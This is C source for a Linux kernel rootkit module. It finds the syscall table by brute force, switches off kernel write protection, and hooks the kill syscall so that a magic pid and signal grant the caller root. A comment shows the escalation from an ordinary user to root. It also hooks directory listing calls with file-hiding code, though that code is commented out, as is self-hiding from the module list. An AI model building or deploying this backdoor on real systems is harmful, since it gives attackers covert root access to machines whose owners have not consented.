#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/errno.h>
#include <linux/types.h>
#include <asm/unistd.h>
#include <asm/current.h>
#include <linux/sched.h>
#include <linux/syscalls.h>
#include <asm/system.h> //are all these even needed?
#include <asm/cacheflush.h>
#include <linux/proc_fs.h>
#include <linux/dirent.h>
#include <linux/fs.h>
#include <linux/sched.h>
//#include <linux/namei.h>
//#include <linux/path.h>
//#include <linux/fs_struct.h>

MODULE_LICENSE("GPL");
#ifdef __i386__
#define START_MEM   0xc0000000 //32bit kernel space
#define END_MEM     0xd0000000
typedef unsigned int address;
#else
#define START_MEM	0xffffffff81000000 //64bit kernel space
#define END_MEM		0xffffffffa2000000
typedef unsigned long long int address;
#endif

#define GPF_DISABLE write_cr0(read_cr0() & (~ 0x10000)) //enables memory writing by changing a register somewhere
#define GPF_ENABLE write_cr0(read_cr0() | 0x10000)      //read somewhere it's terrible practice

address *syscall_table; //address typedef from above for 32/64 compat
address **find(void) { //finds syscall table
    address **sctable;
    address i = START_MEM;
    while ( i < END_MEM ) { //bruteforce through address space
        sctable = (address **)i;
        if ( sctable[__NR_close] == (address *) sys_close) {
            return &sctable[0];
        }
        i += sizeof(void *);
    }
    return NULL;
}
    
/*
[lkm@lkm ~]$ id
uid=1000(lkm) gid=100(users) groups=100(users)
[lkm@lkm ~]$ kill -1337 31337
[lkm@lkm ~]$ id
uid=0(root) gid=0(root) groups=0(root),100(users)
*/

asmlinkage int (*original_kill)(pid_t pid, int sig);

asmlinkage int new_kill(pid_t pid, int sig) { //redefines kill syscall, if killing with sig 1337
    if ((pid == 31337) && (sig == 1337)) {      //and pid 31337 then give parent root privs
        struct task_struct *ptr = current;
        struct cred *cred;
        cred=(struct cred *)__task_cred(ptr); //task creds
        cred->uid = 0; //user id
        cred->gid = 0x31337; //group id //not 0 to allow hiding processes
        cred->suid = 0; //saved uid
        cred->sgid = 0; //saved gid
        cred->euid = 0; //effective uid
        cred->egid = 0; //effective gid
        cred->fsuid = 0; //VFS uid
        cred->fsgid = 0; //VFS gid
        return 0;
    }
    return (*original_kill)(pid,sig);
}

/*
[lkm@lkm ~]$ ls
Makefile  lkm  lkm.ko
[lkm@lkm ~]$ make load
sudo insmod lkm.ko
[lkm@lkm ~]$ ls
Makefile  lkm
[lkm@lkm ~]$ make unload
sudo rmmod lkm
[lkm@lkm ~]$ ls
Makefile  lkm  lkm.ko
*/

struct linux_dirent {
    unsigned long   d_ino;
    unsigned long   d_off;
    unsigned short  d_reclen;
    char            d_name[1];
};

asmlinkage int (*original_getdents)(unsigned int fd, struct linux_dirent *dirp, unsigned int count);
asmlinkage int (*original_getdents64)(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count);

asmlinkage int new_getdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count) {
    char buf[count];
    int bpos,nread;
    //struct linux_dirent *d,*nd;
    //char * hidefile = "lkm.ko"; //this is the substring of a filename we want to hide
    nread = (*original_getdents)(fd,dirp,count); //call the original function to get struct to manipulate
    if (!nread) { return 0; }
    copy_from_user(buf,dirp,nread); //steal what getdents returned so we can traverse
    /*for (bpos = 0; bpos < nread;) { //traverse...
        d = (struct linux_dirent *) (buf + bpos);
        nd = (struct linux_dirent *) (buf + bpos + d->d_reclen);
        printk("%s - %s\n",nd->d_name,hidefile);
        if (strstr(nd->d_name,hidefile)) { //if we have a substring match to hidefile, make the prev record point to next
            d->d_off=(nd->d_off+d->d_off);
            d->d_reclen=(d->d_reclen+nd->d_reclen);
            printk("match\n");
        }
        bpos += d->d_reclen; //next
    }*/
    //copy_to_user(dirp,(struct linux_dirent *)buf,sizeof(buf)); //now put it back to userspace;
    return nread; //and return so the user process can use the getdents
}

asmlinkage int new_getdents64(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count) {
    char buf[count];
    int bpos,nread;
    //struct linux_dirent64 *d,*nd;
    //char * hidefile = "lkm.ko"; //this is the substring of a filename we want to hide
    nread = (*original_getdents64)(fd,dirp,count); //call the original function to get struct to manipulate
    if (!nread) { return 0; }
    copy_from_user(buf,dirp,nread); //steal what getdents returned so we can traverse
    /*for (bpos = 0; bpos < nread;) { //traverse...
        d = (struct linux_dirent64 *) (buf + bpos);
        nd = (struct linux_dirent64 *) (buf + bpos + d->d_reclen);
        printk("%s - %s\n",nd->d_name,hidefile);
        if (strstr(nd->d_name,hidefile)) { //if we have a substring match to hidefile, make the prev record point to next
            d->d_off=(nd->d_off+d->d_off);
            d->d_reclen=(d->d_reclen+nd->d_reclen);
            printk("match64\n");
        }
        bpos += d->d_reclen; //next
    }*/
    //copy_to_user(dirp,(struct linux_dirent64 *)buf,sizeof(buf)); //now put it back to userspace
    return nread; //and return so the user process can use the getdents
}


static int init(void) { //initial function, sets up syscall hijacking
    //struct module *myself = &__this_module; //hide gcc warning
    //list_del(&myself->list); //remove from places such as /proc/modules
	syscall_table = (address *)find(); //give us the syscall table (defined above find())
    if (!syscall_table) {cleanup_module(); } //if find() fails, unload
    original_kill = (void *)syscall_table[__NR_kill]; //store old addresses
    original_getdents = (void *)syscall_table[__NR_getdents];
    original_getdents64 = (void *)syscall_table[__NR_getdents64];
    GPF_DISABLE; //messy, but 2.6 doesn't allow modification without this. see macro above
    syscall_table[__NR_getdents] = (address)new_getdents;
    syscall_table[__NR_kill] = (address)new_kill;
    syscall_table[__NR_getdents64] = (address)new_getdents64;
    GPF_ENABLE;
    printk("LOAD OK\n");
	return 0;
}

void cleanup_module(void) {
    GPF_DISABLE;
    syscall_table[__NR_kill] = (address)original_kill; //corrects the hijacking on unload
    syscall_table[__NR_getdents] = (address)original_getdents;
    syscall_table[__NR_getdents64] = (address)original_getdents64;
    GPF_ENABLE;
    printk("UNLOAD OK\n");
    return;
}

module_init(init);
